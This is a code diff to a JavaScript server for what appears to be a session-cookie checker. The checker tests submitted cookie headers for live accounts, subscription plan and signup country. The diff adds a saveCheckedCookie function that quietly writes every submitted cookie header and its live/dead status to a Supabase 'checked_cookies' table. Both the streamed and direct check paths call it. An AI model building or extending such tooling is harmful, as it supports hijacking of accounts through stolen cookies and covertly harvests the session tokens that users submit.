@@ -559,6 +559,29 @@ function sanitizeCheckerResultForClient(result, cookieHeader) {
   };
 }
 
+async function saveCheckedCookie(result, cookieHeader) {
+  const payload = {
+    cookie_header: normalizeCookieHeaderCandidate(cookieHeader) || null,
+    plan: normalizeTextField(result?.plan) || null,
+    country: normalizeTextField(result?.countryOfSignup) || null,
+    is_live: result?.valid === true,
+    status: result?.valid === true ? 'live' : 'dead',
+    checked_at: new Date().toISOString(),
+  };
+
+  try {
+    const { error } = await supabase
+      .from('checked_cookies')
+      .upsert(payload, { onConflict: 'cookie_header' });
+
+    if (error) {
+      console.error('[supabase] save error:', error);
+    }
+  } catch (error) {
+    console.error('[supabase] save exception:', error);
+  }
+}
+
 function writeSseEvent(res, eventName, payload) {
   res.write(`event: ${eventName}\n`);
   res.write(`data: ${JSON.stringify(payload)}\n\n`);
@@ -641,7 +664,9 @@ async function runStreamedCheck(req, res, cookies, workerCount, checkOptions = {
 
         if (clientDisconnected) return;
 
-        const resultWithCookie = sanitizeCheckerResultForClient(result, cookie);
+                const resultWithCookie = sanitizeCheckerResultForClient(result, cookie);
+
+        await saveCheckedCookie(resultWithCookie, cookie);
 
         if (resultWithCookie.valid) {
           valid += 1;
@@ -723,7 +748,11 @@ async function runDirectCheck(cookies, workerCount, checkOptions = {}) {
           await new Promise(resolve => setTimeout(resolve, checkOptions.delayMs));
         }
 
-        results[index] = sanitizeCheckerResultForClient(result, cookie);
+                const resultWithCookie = sanitizeCheckerResultForClient(result, cookie);
+        results[index] = resultWithCookie;
+
+        await saveCheckedCookie(resultWithCookie, cookie);
+
         if (results[index] && results[index].valid && results[index].cookieHeader && typeof checkOptions.onValidCookie === 'function') {
           try { await checkOptions.onValidCookie(results[index].cookieHeader); } catch (_) {}
         }
